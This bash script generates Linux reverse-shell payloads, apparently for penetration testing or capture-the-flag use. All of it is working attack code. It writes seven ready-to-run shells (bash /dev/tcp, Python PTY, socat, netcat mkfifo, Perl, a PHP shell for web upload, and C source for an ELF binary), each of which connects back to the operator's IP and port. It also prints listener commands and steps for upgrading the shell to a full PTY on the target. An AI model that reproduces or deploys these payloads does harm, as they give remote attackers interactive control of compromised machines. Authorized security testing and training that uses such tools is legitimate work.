#!/usr/bin/env bash
# gen_linux_shell.sh — Linux reverse shell generator
#
# Generates multiple reverse shell payloads in one shot:
#   1. bash_shell.sh      — /dev/tcp one-liner (most reliable)
#   2. python_shell.py    — Python PTY reverse shell
#   3. socat_shell.sh     — socat interactive TTY shell
#   4. nc_shell.sh        — netcat with mkfifo (no -e needed)
#   5. perl_shell.pl      — Perl socket reverse shell
#   6. php_shell.php      — PHP reverse shell (for web upload)
#   7. elf_revshell.c     — C source → compile to native ELF
#
# All payloads auto-populated with LHOST/LPORT from arguments.
# Run once, pick whichever fits the target environment.
#
# Usage:
#   ./gen_linux_shell.sh [interface] [port] [output_dir]
#
# Defaults:
#   interface   = tun0
#   port        = 4444
#   output_dir  = ./shells

set -eu

# ── Arguments ──────────────────────────────────────────────────────────────────
IFACE="${1:-tun0}"
LPORT="${2:-4444}"
OUTDIR="${3:-./shells}"

# ── Validation ─────────────────────────────────────────────────────────────────
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || (( LPORT < 1 || LPORT > 65535 )); then
    echo "[!] Invalid port: '$LPORT'  (must be 1–65535)" >&2
    exit 1
fi

LHOST=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || true)
if [[ -z "$LHOST" ]]; then
    echo "[!] Could not resolve IP from interface: $IFACE" >&2
    exit 1
fi

echo "[*] LHOST : $LHOST  ($IFACE)"
echo "[*] LPORT : $LPORT"
echo "[*] Output: $OUTDIR/"
echo ""

mkdir -p "$OUTDIR"

# ── 1. Bash /dev/tcp ──────────────────────────────────────────────────────────
cat > "$OUTDIR/bash_shell.sh" << PAYLOAD
#!/bin/bash
bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1
PAYLOAD
chmod +x "$OUTDIR/bash_shell.sh"
echo "[+] bash_shell.sh       — /dev/tcp one-liner (most compatible)"

# ── 2. Python PTY ─────────────────────────────────────────────────────────────
cat > "$OUTDIR/python_shell.py" << 'PYEOF'
#!/usr/bin/env python3
import os,pty,socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
PYEOF
# Append the connection line with variables expanded
cat >> "$OUTDIR/python_shell.py" << PYEOF
s.connect(("${LHOST}",${LPORT}))
PYEOF
cat >> "$OUTDIR/python_shell.py" << 'PYEOF'
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
PYEOF
chmod +x "$OUTDIR/python_shell.py"
echo "[+] python_shell.py     — Python3 PTY (full interactive)"

# ── 3. Socat TTY ──────────────────────────────────────────────────────────────
cat > "$OUTDIR/socat_shell.sh" << PAYLOAD
#!/bin/bash
# Target: requires socat installed
# Listener: socat file:\$(tty),raw,echo=0 tcp-listen:${LPORT}
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}
PAYLOAD
chmod +x "$OUTDIR/socat_shell.sh"
echo "[+] socat_shell.sh      — socat interactive TTY (best quality)"

# ── 4. Netcat mkfifo ──────────────────────────────────────────────────────────
cat > "$OUTDIR/nc_shell.sh" << PAYLOAD
#!/bin/bash
# Works with any netcat — no -e flag needed
TMP=\$(mktemp -u)
mkfifo \$TMP
cat \$TMP | /bin/bash -i 2>&1 | nc ${LHOST} ${LPORT} > \$TMP
rm -f \$TMP
PAYLOAD
chmod +x "$OUTDIR/nc_shell.sh"
echo "[+] nc_shell.sh         — netcat + mkfifo (no -e required)"

# ── 5. Perl ───────────────────────────────────────────────────────────────────
cat > "$OUTDIR/perl_shell.pl" << PAYLOAD
#!/usr/bin/perl
use Socket;
\$i="${LHOST}";
\$p=${LPORT};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in(\$p,inet_aton(\$i)));
open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
exec("/bin/bash -i");
PAYLOAD
chmod +x "$OUTDIR/perl_shell.pl"
echo "[+] perl_shell.pl       — Perl socket shell"

# ── 6. PHP ────────────────────────────────────────────────────────────────────
cat > "$OUTDIR/php_shell.php" << PAYLOAD
<?php
\$sock=fsockopen("${LHOST}",${LPORT});
\$proc=proc_open("/bin/bash -i", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);
?>
PAYLOAD
echo "[+] php_shell.php       — PHP (for web shell upload)"

# ── 7. C source → ELF ────────────────────────────────────────────────────────
cat > "$OUTDIR/elf_revshell.c" << PAYLOAD
/* Compile: gcc -o revshell elf_revshell.c -nostartfiles -static (optional)
   Or:      gcc -o revshell elf_revshell.c                                 */
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
    int fd;
    struct sockaddr_in sa;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return 1;

    sa.sin_family = AF_INET;
    sa.sin_port = htons(${LPORT});
    sa.sin_addr.s_addr = inet_addr("${LHOST}");

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) return 1;

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    char *argv[] = {"/bin/bash", "-i", NULL};
    execve(argv[0], argv, NULL);
    return 0;
}
PAYLOAD
echo "[+] elf_revshell.c      — C source (compile → native ELF binary)"

# ── Summary ────────────────────────────────────────────────────────────────────
echo ""
echo "── All payloads in: $OUTDIR/ ─────────────────────────────────────────────"
echo ""
echo "  Listener:  rlwrap nc -lvnp $LPORT"
echo ""
echo "  Compile ELF:   gcc -o revshell $OUTDIR/elf_revshell.c"
echo "  Compile ELF (static): gcc -o revshell $OUTDIR/elf_revshell.c -static"
echo ""
echo "  Socat listener (for socat_shell.sh):"
echo "    socat file:\$(tty),raw,echo=0 tcp-listen:$LPORT"
echo ""
echo "  Upgrade any shell to full PTY (on target after connect):"
echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "    Ctrl+Z → stty raw -echo; fg → export TERM=xterm"
echo "───────────────────────────────────────────────────────────────────────────"
